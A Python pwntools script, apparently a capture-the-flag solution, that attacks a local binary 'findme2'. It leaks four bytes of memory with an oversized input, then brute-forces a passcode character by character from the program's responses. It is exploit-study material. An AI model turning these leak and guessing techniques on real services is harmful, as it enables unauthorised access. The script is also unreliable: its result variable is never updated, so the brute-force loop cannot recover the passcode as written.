from pwn import *
from string import *

p = process('./findme2')

payload = ['4' for i in range(0x15)]
p.recvuntil('op:')
p.sendline('3')
p.recvuntil('code:')
p.sendline(''.join(payload)  + 'end')
print (''.join(payload)  + 'end')
p.recvuntil('end')
data = p.recv(4)
log.success(hex(u32(data)))

res = ''
for i in printable[:-6]:
	p.recvuntil('op')
	p.sendline('33')
	p.recvuntil('code:\n')

	payload = res + i 
	payload = payload.ljust(0x17, '*')
	payload += '@'
	p.sendline(payload)
	data = p.recvuntil(' is ')
	t = data[-8:-4]
	print t+'-------------------------------'+i
	index = data.find('@')
	if data[index+1:index+2] == ' ':
		log.success(' found' + '------------------' + i)
	if data[index+1:index+2] == '\xff':
		log.debug('ff found' + '------------------' + chr(ord(i)+1))
log.info('passcode: '+res)
p.interactive()
